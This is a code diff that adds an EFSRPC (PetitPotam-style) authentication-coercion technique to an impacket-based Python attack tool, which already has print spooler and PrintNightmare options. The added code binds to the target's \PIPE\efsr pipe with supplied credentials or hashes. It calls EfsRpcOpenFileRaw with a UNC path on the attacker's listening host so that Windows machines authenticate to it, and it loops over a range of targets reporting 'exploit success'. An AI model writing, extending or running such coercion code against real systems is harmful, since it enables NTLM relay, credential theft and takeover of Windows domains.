@@ -14,6 +14,76 @@ from impacket.dcerpc.v5 import rprn, transport
 from impacket.dcerpc.v5.dtypes import NULL, UUID, ULONG, WSTR
 from impacket.structure import Structure, hexdump
 
+from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.uuid import uuidtup_to_bin
+
+class DRIVER_INFO_2_BLOB(Structure):
+	structure = (
+		('cVersion', '<L'),
+		('NameOffset', '<L'),
+		('EnvironmentOffset', '<L'),
+		('DriverPathOffset', '<L'),
+		('DataFileOffset', '<L'),
+		('ConfigFileOffset', '<L')
+	)
+
+	def __init__(self, data=None):
+		Structure.__init__(self, data=data)
+
+	def fromString(self, data):
+		Structure.fromString(self, data)
+
+		self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']:self['DataFileOffset']].decode('utf-16-le')
+		self['DataFileArray'] = self.rawData[self['DataFileOffset']:self['DriverPathOffset']].decode('utf-16-le')
+		self['DriverPathArray'] = self.rawData[self['DriverPathOffset']:self['EnvironmentOffset']].decode('utf-16-le')
+		self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']:self['NameOffset']].decode('utf-16-le')
+		self['NameArray'] = self.rawData[self['NameOffset']:len(self.rawData)].decode('utf-16-le')
+
+
+class DCERPCSessionError(DCERPCException):
+	def __init__(self, error_string=None, error_code=None, packet=None):
+		DCERPCException.__init__(self, error_string, error_code, packet)
+
+	def __str__(self):
+		key = self.error_code
+		if key in system_errors.ERROR_MESSAGES:
+			error_msg_short = system_errors.ERROR_MESSAGES[key][0]
+			error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
+			return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
+		else:
+			return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code
+
+
+# STRUCTURES
+class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
+	align = 1
+	structure = (
+		('Data', '20s'),
+	)
+
+
+# RPC CALLS
+class GEfsRpcOpenFileRaw(NDRCALL):
+	opnum = 0
+	structure = (
+		('fileName', WSTR),
+		('Flag', ULONG),
+	)
+
+
+class GEfsRpcOpenFileRawResponse(NDRCALL):
+	structure = (
+		('hContext', EXIMPORT_CONTEXT_HANDLE),
+		('ErrorCode', ULONG),
+	)
+
+
+# OPNUMs and their corresponding structures
+OPNUMS = {
+	0: (GEfsRpcOpenFileRaw, GEfsRpcOpenFileRawResponse),
+}
+
 class DcePrinterPwn:
 
 	def __init__(self):
@@ -60,6 +130,67 @@ class DcePrinterPwn:
 		except Exception as e:
 			return False
 
+		return True
+
+	def connect_efs(self):
+		assert self.rhost is not None and self.rport is not None
+		assert self.domain is not None and self.user is not None
+		assert self.passwd is not None
+
+		PIPES = [
+			'\\PIPE\\efsr',     # Enabled by default on win 2016 DCs
+			'\\PIPE\\lsass',
+#			'\\PIPE\\lsarpc',   # NULL auth accepted
+			'\\PIPE\\samr',     # NULL auth accepted
+			'\\PIPE\\netlogon'
+		]
+
+		# https://twitter.com/_nwodtuhs/status/1417841637510860805?s=20
+		# Also possible via efsrpc (by changing UUID) but this named pipe is less universal and rarer than lsarpc
+#		bindStr = f"ncacn_np:{self.rhost}[\\PIPE\\efsrpc]"
+		bindStr = f"ncacn_np:{self.rhost}[\\PIPE\\efsr]"
+		rpcTrans = transport.DCERPCTransportFactory(bindStr)
+
+		rpcTrans.set_dport(self.rport)
+
+		if hasattr(rpcTrans, 'set_credentials'):
+			rpcTrans.set_credentials(self.user, self.passwd, self.domain, self.nthash, self.lmhash)
+
+		self._dce = rpcTrans.get_dce_rpc()
+
+		try:
+			self._dce.connect()
+		except Exception as e:
+			print(e)
+			return False
+
+		try:
+			# EFSRPC named pipe
+			MSRPC_UUID_EFSRPC = uuidtup_to_bin(('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'))
+			self._dce.bind(MSRPC_UUID_EFSRPC)
+		except Exception as e:
+			print(e)
+			return False
+
+		return True
+
+	def call_efs_open_file_raw(self):
+		assert self._dce is not None and self.lhost is not None
+
+		try:
+			request = GEfsRpcOpenFileRaw()
+			request['fileName'] = f"\\\\{self.lhost}\\c$\\Settings.ini\x00"
+			request['Flag'] = 0
+
+			resp = self._dce.request(request)
+		except Exception as e:
+			if str(e).find('ERROR_BAD_NETPATH') >= 0:
+				pass
+			else:
+				self._dce.disconnect()
+				return False
+
+		self._dce.disconnect()
 		return True
 
 	def call_open_printer(self):
@@ -185,7 +316,7 @@ def generate_targets(target):
 
 def main():
 	parser = argparse.ArgumentParser(add_help=True, description='Coerce remote systems to authenticate', formatter_class=argparse.RawDescriptionHelpFormatter)
-	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare'])
+	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare', 'efsrpc'])
 	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
 	parser.add_argument('--share', action='store', required=False, default=None, help='path to DLL (ex: \'\\\\10.1.10.199\\share\\Program.dll\')')
 	parser.add_argument('--lhost', action='store', required=False, default=None, help='listening hostname or IP')
@@ -195,6 +326,7 @@ def main():
 
 	group = parser.add_argument_group('connection')
 	group.add_argument('-target-ip', action='store', metavar='ip address', help='IP Address of the target machine. If omitted it will use whatever was specified as target.')
+	group.add_argument('-port', action='store', metavar='destination port', default=445, choices=[139, 445], type=int, help='remote SMB server port')
 	args = parser.parse_args()
 
 	if len(sys.argv) == 1:
@@ -308,6 +440,38 @@ def main():
 				else:
 					print(f'exploit failed')
 
+			else:
+				print(f'port closed')
+				continue
+
+	else:
+		for rhost in generate_targets(address):
+			print(f"[*] {rhost}...", end='', flush=True)
+
+			if tcp_port_open(rhost, args.port, timeout=1):
+				dce = DcePrinterPwn()
+				dce.rhost = rhost
+				dce.rport = args.port
+				dce.lhost = args.lhost
+				dce.domain = domain
+				dce.user = username
+				dce.passwd = password
+				dce.nthash = nthash
+				dce.lmhash = lmhash
+
+				response = dce.connect_efs()
+
+				# Go to next target if connection failed
+				if response is False:
+					print(f'connection failed')
+					continue
+
+				print(f'connected...', end='', flush=True)
+
+				if dce.call_efs_open_file_raw() is False:
+					print(f'exploit failed')
+				else:
+					print(f'exploit success')
 			else:
 				print(f'port closed')
 				continue
